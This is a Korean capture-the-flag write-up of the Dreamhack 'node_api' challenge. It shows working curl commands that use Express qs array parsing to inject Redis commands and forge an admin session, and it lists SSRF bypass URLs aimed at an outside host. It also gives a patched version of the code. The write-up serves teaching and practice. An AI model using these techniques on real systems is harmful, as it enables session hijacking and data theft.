---
layout: post
title:  "Dreamhack 워게임 node_api 풀이 — Express qs 배열 파싱으로 Redis 명령어 인젝션, 세션 위조하기"
date:   2026-05-18 14:00:00 +0900
categories: security web wargame dreamhack writeup nodejs redis injection session
---

## 들어가며

Dreamhack 웹해킹 워게임 **node_api** (난이도 별 1, 풀이자 428명) 풀이입니다. 표면적으로는 "Redis 에 저장된 로그를 보여주는 간단한 디버그 엔드포인트" 인데, 실제로는 **HTTP Parameter Pollution → Express `qs` 배열 파싱 → Redis 명령어 인젝션 → 세션 위변조** 라는 깔끔한 4단 체인이 의도된 풀이입니다. CTF에서 자주 등장하는 "프레임워크의 입력 타입 가정을 무시하면 어떻게 부서지는가" 의 교과서 같은 예제죠.

문제 설명:

> challenge for advanced web hacker!

설명이 한 줄밖에 없어서 더 무섭게 느껴지지만 (실은 별 1 입니다), 소스를 보면 의외로 작은 함정 하나만 알면 풀립니다.

스포일러로 결론부터:

```bash
SERVER="http://host3.dreamhack.games:PORT"
# 1) 게스트로 로그인 → 세션이 Redis 에 생긴다
curl -c jar.txt "$SERVER/login?userid=guest&userpw=guest"
# 2) 쿠키에서 SID 추출 → s:<SID>.<sig> 형태
SID=$(grep connect.sid jar.txt | awk '{print $7}' \
        | python3 -c "import urllib.parse,sys;v=urllib.parse.unquote(sys.stdin.read().strip());print(v.split(':')[1].split('.')[0])")
# 3) /show_logs 에 qs 배열 트릭으로 SET 명령 주입 → 내 세션 userid 를 admin 으로
NEW='{"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"userid":"admin"}'
curl -G "$SERVER/show_logs" -b jar.txt \
  --data-urlencode "log_query[0]=set" \
  --data-urlencode "log_query[1][]=sess:$SID" \
  --data-urlencode "log_query[1][]=$NEW"
# 4) /flag 호출 → DH{...} 획득
curl -b jar.txt "$SERVER/flag"
# → DH{c5adc4033f8b685d84d56423082f21ac}
```

핵심 트릭은 단 한 줄:

> `req.query.log_query.split('/')` 가 던지는 예외(`TypeError: split is not a function`) 가 try-catch 로 **삼켜져서** `log_query` 가 원래 모양(배열) 그대로 다음 try 블록까지 도달한다.

## 1. 소스 코드 살펴보기

ZIP 안에는 `main.js` 와 `package.json` 두 파일만 있습니다. 의존성부터 확인해보면 단서가 보입니다.

```json
{
  "dependencies": {
    "connect-redis": "^4.0.4",
    "express": "^4.17.1",
    "express-session": "^1.17.0",
    "redis": "^3.0.2"
  }
}
```

Express + express-session + Redis 백엔드. 세션이 Redis 에 저장된다는 것은 **세션 데이터의 위치(키)를 알면 내용을 조작할 수 있다** 는 뜻이고, 그래서 보통 이런 조합은 SSRF 나 명령어 인젝션과 잘 어울립니다.

이어서 `main.js`. 길지 않으니 통째로 봅시다.

```javascript
const FLAG = function() {
    try {
        return require('fs').readFileSync('flag.txt').toString();
    } catch (err) {
        return 'DH{*****}';
    }
}()

const express = require('express');
const session = require('express-session');
const app = express();

const redis = require('redis');
const redis_client = redis.createClient();

const connectRedis = require('connect-redis');

const RedisStore = connectRedis(session);
const sess = {
    resave: false,
    secret: 'dreamhack',
    store: new RedisStore({ client: redis_client }),
};

const db = {
    'guest': 'guest',
    'dreamhack': '1234',
    'ADMIN': 'this_is_admin?'
}

function login(user) {
    return user.userpw && db[user.userid] == user.userpw;
}

app.use(session(sess));
redis_client.set('log_info', 'KEY: "log_" + new Date().getTime(), VALUE: userid');

app.get('/show_logs', function(req, res) {
    var log_query = req.query.log_query;
    try {
        log_query = log_query.split('/');
        if (log_query[0].toLowerCase() != 'get') {
            log_query[0] = 'get';
        }
        log_query[1] = log_query.slice(1)
    } catch (err) {
        // Todo
        // Error(403);
    }
    try {
        redis_client.send_command(log_query[0], log_query[1], function(err, result) {
            if (err) { res.send('ERR'); }
            else     { res.send(result); }
        })
    } catch (err) {
        res.send('try /show_logs?log_query=get/log_info')
    }
});

app.get('/login', function(req, res) {
    redis_client.set('log_' + new Date().getTime(), 'userid: ' + req.session.userid);
    if (login(req.query)) {
        req.session.userid = req.query.userid;
        res.send('<script>alert("login!");history.go(-1);</script>');
    } else {
        res.send('<script>alert("login failed!");history.go(-1);</script>');
    }
});

app.get('/flag', function(req, res) {
    if (req.session.userid === "admin") {
        res.send(FLAG)
    } else {
        res.send('hello ' + req.session.userid);
    }
});
```

## 2. 1차 탐색 — 깔끔하게 막아둔 부분과 어색한 부분

### 2.1 `/flag` 의 인증 조건

```javascript
if (req.session.userid === "admin") { res.send(FLAG) }
```

`===` 엄격 동등, 그리고 문자열은 **소문자 `"admin"`**. 그런데 로그인용 DB 를 보면:

```javascript
const db = {
    'guest': 'guest',
    'dreamhack': '1234',
    'ADMIN': 'this_is_admin?'   // ← 대문자
}
```

대문자 `ADMIN` 으로 로그인하면 `req.session.userid = "ADMIN"` 이 저장되니까 `=== "admin"` 비교에서 실패합니다. `db['admin']` 은 `undefined` 이고 `undefined == 'anything'` 은 거짓이라 일반 로그인 경로로는 소문자 `admin` 으로 들어갈 수 없습니다.

→ 정상 로그인으로는 `userid = "admin"` 세션을 만들 수 없다. 그러면 **세션을 강제로 만들어 넣어야** 합니다. 어디서? Redis 에서.

### 2.2 `/show_logs` 의 모양이 묘하게 이상하다

```javascript
log_query = log_query.split('/');
if (log_query[0].toLowerCase() != 'get') {
    log_query[0] = 'get';
}
log_query[1] = log_query.slice(1)
```

처음에는 "/" 로 자른 다음 첫 토큰이 무조건 `'get'` 이 되도록 강제합니다. 즉 **명령어를 GET 으로 고정** 시키려는 가드처럼 보입니다. 그러면 `redis_client.send_command('get', ...)` 만 가능한 거 아닌가?

여기서 처음 접한 사람이 흔히 멈춥니다. "GET 만 되는데, 세션을 어떻게 덮어쓰지?"

하지만 두 가지를 같이 봐야 합니다:

1. `try { ... } catch (err) { /* Todo */ }` — **그냥 삼킨다**. 예외가 나면 `log_query` 는 가공되지 않은 채로 다음 블록에 전달됩니다.
2. `req.query.log_query` 의 **타입을 가정하지 않았다**. 문자열이라고 믿고 `.split` 을 호출할 뿐.

이 두 가지가 합쳐지면, "log_query 를 문자열이 아니게 만들면 가드를 건너뛸 수 있다" 라는 발상이 나옵니다.

## 3. Express + `qs` 의 배열 파싱 — 입력 타입을 쉽게 바꿀 수 있다

Express 의 기본 쿼리스트링 파서는 [`qs`](https://github.com/ljharb/qs) 라이브러리입니다. `qs` 는 PHP 의 `$_GET` 처럼 대괄호 표기로 배열·객체를 만들 수 있어요.

| URL 쿼리 | `req.query.log_query` |
|---|---|
| `?log_query=get/log_info` | `"get/log_info"` (문자열) |
| `?log_query=get&log_query=log_info` | `["get", "log_info"]` (배열) |
| `?log_query[0]=set&log_query[1][]=key&log_query[1][]=val` | `["set", ["key", "val"]]` (중첩 배열) |

마지막 형태가 가장 강력합니다. 로컬에서 한 번 검증해보면:

```javascript
const qs = require('qs');
qs.parse('log_query[0]=set&log_query[1][]=key&log_query[1][]=val')
// → { log_query: [ 'set', [ 'key', 'val' ] ] }
```

이걸 `/show_logs` 에 넣으면:

1. `log_query = ['set', ['key', 'val']]`
2. `log_query.split('/')` → 배열에는 `.split` 가 없으므로 `TypeError` 발생 → **catch 로 조용히 삼킴**
3. 그래서 `log_query` 는 여전히 `['set', ['key', 'val']]`
4. `redis_client.send_command(log_query[0], log_query[1], cb)`
   → `send_command('set', ['key', 'val'], cb)`
5. Redis 입장에서 `SET key val` 실행 ✅

가드를 통과하지 않은 게 아니라, **예외 처리 한 줄 덕에 가드 자체를 건너뛰어 버린** 거죠. 이제 `set` 만이 아니라 `del`, `hset`, `flushall`, `keys`, `eval`, 무엇이든 보낼 수 있습니다. **사실상 Redis 풀 RCE 동급의 명령어 인젝션**.

> 비유: 사내 게이트에 "양식 안 갖추고 오면 양식 갖춰드림" 직원이 있는데, 양식이 너무 이상해서 직원이 기절(throw)해버리면 뒤에 있는 보안 검색대는 그냥 통과되는 상황.

## 4. 세션을 admin 으로 바꾸기

### 4.1 세션 ID 추출

`/` 한 번만 쳐도 express-session 이 `Set-Cookie: connect.sid=...` 를 내려줍니다.

```
Set-Cookie: connect.sid=s%3Axwb9G3q_1gOqWO-MySXWjJ48WzSnvUFk.YIpA%2By...
```

URL 디코딩하면 `s:xwb9G3q_1gOqWO-MySXWjJ48WzSnvUFk.YIpA+y...` 형태. 앞쪽 `s:` 와 마지막 `.` 사이가 진짜 세션 ID (`xwb9G3q_1gOqWO-MySXWjJ48WzSnvUFk`). 뒤쪽은 `secret = 'dreamhack'` 으로 HMAC 한 서명이고요. 서명 자체는 서버가 검증하니까 **내용물만 바꾸면 됩니다**.

[connect-redis](https://github.com/tj/connect-redis) 의 기본 prefix 는 `sess:` 이므로 Redis 키는 `sess:xwb9G3q_1gOqWO-MySXWjJ48WzSnvUFk`.

### 4.2 세션 데이터 미리 만들기

`/show_logs` 에서 세션을 GET 해보려면 먼저 Redis 에 세션이 저장되어 있어야 합니다. express-session 은 `req.session` 에 **무언가가 쓰여야** 디스크(여기선 Redis)에 저장합니다. 그래서 한 번 `/login?userid=guest&userpw=guest` 를 호출해서 `req.session.userid = 'guest'` 를 채워둡니다.

```bash
curl -c jar.txt "$SERVER/login?userid=guest&userpw=guest"
# → <script>alert("login!");...</script>
```

이제 직전 트릭으로 세션을 읽어봅시다:

```bash
curl -b jar.txt -G "$SERVER/show_logs" \
  --data-urlencode "log_query[0]=get" \
  --data-urlencode "log_query[1][]=sess:$SID"
# → {"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"userid":"guest"}
```

깔끔한 JSON 입니다. `userid` 만 `admin` 으로 바꿔 그대로 `SET` 하면 됩니다.

### 4.3 세션 위조 → 플래그 획득

```bash
NEW='{"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"userid":"admin"}'

curl -b jar.txt -G "$SERVER/show_logs" \
  --data-urlencode "log_query[0]=set" \
  --data-urlencode "log_query[1][]=sess:$SID" \
  --data-urlencode "log_query[1][]=$NEW"
# → OK

curl -b jar.txt "$SERVER/flag"
# → DH{c5adc4033f8b685d84d56423082f21ac}
```

쿠키 안의 SID 는 그대로(서명도 그대로) 두고, Redis 쪽 값만 갈아끼웠을 뿐인데 서버는 "어 admin 이네" 라며 플래그를 토해냅니다. **세션을 신뢰의 근거로 삼되, 그 저장소를 검증 없이 외부에 노출시키면** 무슨 일이 벌어지는지 보여주는 깔끔한 예시.

## 5. 한 번 더 정리 — 무엇을 배웠나

### 5.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| `req.query.log_query` 타입 가정 | Input Validation 부재 | 문자열만 들어온다고 믿음 |
| `try-catch` 로 가드를 삼킴 | Improper Error Handling | 예외 발생 시 입력을 그대로 다음 단계로 흘려보냄 |
| `send_command(arr, arr)` | Server-Side Request Tampering / Command Injection | Redis 가 인자 배열을 그대로 신뢰 |
| `sess:<sid>` 직접 쓰기 | Session Fixation / Forgery | 세션 저장소를 무방비 노출 |

### 5.2 입문자가 챙겨가면 좋은 시각

- "GET 만 허용" 같은 화이트리스트는 **들어오는 입력 모양을 통제할 수 있을 때만** 보안이 된다. 입력 모양 자체를 흔들 수 있으면 (배열 인젝션, 프로토타입 폴루션, 멀티파트 폼 트릭 등) 보안은 사라진다.
- `try-catch` 의 빈 `catch` 블록은 "여기 버그 있어요" 라는 표지판이다. 코드 리뷰할 때 가장 먼저 보는 곳.
- 세션을 **외부에서 직접 쓸 수 있는** 저장소(Redis, Memcached, DB)에 둘 때는 키 이름 prefix 만 가지고 안전하다고 생각하면 안 된다. 키도, 값도, 둘 다 접근 통제가 필요하다.

### 5.3 같은 코드를 안전하게 고친다면

```javascript
app.get('/show_logs', function(req, res) {
    const q = req.query.log_query;

    // ① 타입을 강제로 좁힘
    if (typeof q !== 'string') return res.status(400).send('bad input');

    // ② split 결과 길이까지 검증
    const parts = q.split('/');
    if (parts.length < 2 || parts[0].toLowerCase() !== 'get') {
        return res.status(400).send('only get/<key> allowed');
    }

    // ③ key 도 허용 패턴으로 좁힘 (sess:* 같은 민감 key 차단)
    const key = parts.slice(1).join('/');
    if (!/^log_[A-Za-z0-9_]+$/.test(key)) {
        return res.status(403).send('key not allowed');
    }

    redis_client.get(key, (err, result) => {
        if (err) return res.send('ERR');
        res.send(result);
    });
});
```

세 가지 가드를 더 두는 것만으로 4단 체인 전체가 끊깁니다. **"입력의 타입과 모양을 좁히고, 빈 catch 를 피하고, 민감 키 prefix 를 차단한다"** — 자주 등장하는 3종 세트.

## 6. 시도했지만 실패한 것들 (회고)

문제 리스트를 정렬해서 받은 순서대로 위에서부터 풀어보려고 시도했는데, 첫 두 문제는 시간 낭비가 많았습니다. 다음 번에 같은 함정을 다시 밟지 않으려고 솔직히 적어둡니다.

### 6.1 시도 1 — weird legacy (id 1050) 에서 막힘

먼저 풀려고 했던 문제는 풀이자 수가 두 번째로 많은 `weird legacy`. 소스는 단순한 SSRF:

```javascript
if (host !== "localhost" && !host.endsWith("localhost")) return res.send("rejected");
let result = await node_fetch(url, { headers: { "Cookie": `FLAG=${FLAG}` } });
res.send(await result.text());
```

문제 이름 "legacy" 와 `node-fetch@2.6.6` (CVE-2022-0235 직전 버전) 의 조합을 보고 **WHATWG `new URL()` 과 `url.parse()` 의 backslash 처리 차이를 노린 SSRF bypass** 라고 확신했습니다. 즉 `http://localhost\@webhook.site/...` 같은 URL.

투입한 가설과 결과는 대략:

- 백슬래시 트릭 (`http://localhost\@evil/...`) → **실패**. 모던 Node 의 `url.parse` 와 `new URL` 모두 backslash 를 forward slash 로 정규화함. Node 14, 18, 20 전부 확인.
- 선행 공백 + 백슬래시 (` http://localhost\@evil/...`) → **실패**. node-fetch 내부 정규식이 scheme 매칭을 못해 `url.parse` 폴백을 타게 만들 수 있었지만, 그 `url.parse` 자체가 이미 backslash 를 정규화함.
- `%5C`, `%2E`, `%09`, `%0d%0a` 같은 percent-encoding 변형 → 전부 `Invalid URL` 또는 hostname 이 localhost 가 아닌 다른 것이 되어 가드에 막힘.
- `attacker.com.localhost` 류 (endsWith 통과) → DNS 가 풀리지 않아 `Request Failed`. `.localhost` 는 RFC 6761 예약 TLD 라 공용 DNS 에서 외부 IP 로 매핑 불가능.
- CVE-2022-0235 의 정규 경로 (localhost → 외부로 3xx 리다이렉트) → **포기**. 서버 자체에 리다이렉트 엔드포인트가 없고, 외부 리다이렉터를 가리키려면 또 hostname 이 `.endsWith("localhost")` 를 만족해야 하는 닭과 달걀 문제.

40분쯤 헤매다가 "오늘 안에 한 문제는 풀어야 하니까" 라고 손절했습니다.

**회고 — 다음에 어떻게 다르게 할 것인가**:

1. **PoC 가설을 30분 안에 못 세우면 즉시 다른 문제로 스위치**. 풀이자 수가 비슷한 다른 candidate 가 많을 때, "이 문제만 풀겠다" 는 매몰비용에 갇히지 말 것.
2. **로컬에서 같은 Node 버전을 못 띄울 때는 가설 검증이 불가능에 가깝다**. 도커 실행이 금지된 환경이라 더더욱 그렇고, 이런 제약 아래서는 "URL 파서 quirk" 같은 버전 의존적 가설은 우선순위를 낮춰야 한다.
3. **소스에서 명백히 풀 수 있는 게 보이는 문제부터** (이번 `node_api` 처럼 정적 코드 리뷰만으로 체인이 보이는 것) 우선 정리하고, 외부 환경 의존이 큰 문제(SSRF, DNS, 시간 공격)는 시간 여유 있을 때 따로 다루는 편이 효율적.

### 6.2 시도 2 — Guest book v0.2 (id 48) 중복 글 회피로 한 단계 더 거른 것

원래 풀이자 수 1위인 `Guest book v0.2` 부터 도전하려고 했는데, 블로그 `_posts/` 를 보니 이미 [같은 문제 풀이](/2026/05/16/dreamhack-guest-book-writeup.html) 가 있더군요. Dreamhack 쪽에서는 여전히 "미해결" 로 잡혀 있어서 (플래그가 인스턴스마다 바뀌는 동적 플래그일 수도 있어서) "다시 풀고 다시 글 쓸까" 잠시 고민했지만, 입문자용 해설 글이 같은 주제로 두 개 있는 게 더 헷갈릴 것 같아 next-best 후보로 넘어갔습니다.

**회고**: 작업 시작 전 `ls _posts/ | grep` 로 **글 중복 여부부터 체크**하고 문제 선정 우선순위를 다듬는 게 정석. 이번엔 두 번째 문제(weird legacy) 에 빠진 뒤에야 이 흐름을 확립했음. 처음부터 했으면 30분 절약했을 듯.

---

전체 풀이 시간 자체보다 "잘못된 문제에 시간을 쓰지 않는 법" 을 배우는 게 더 큰 수확이었던 회차였습니다. 다음 풀이로 만나요.
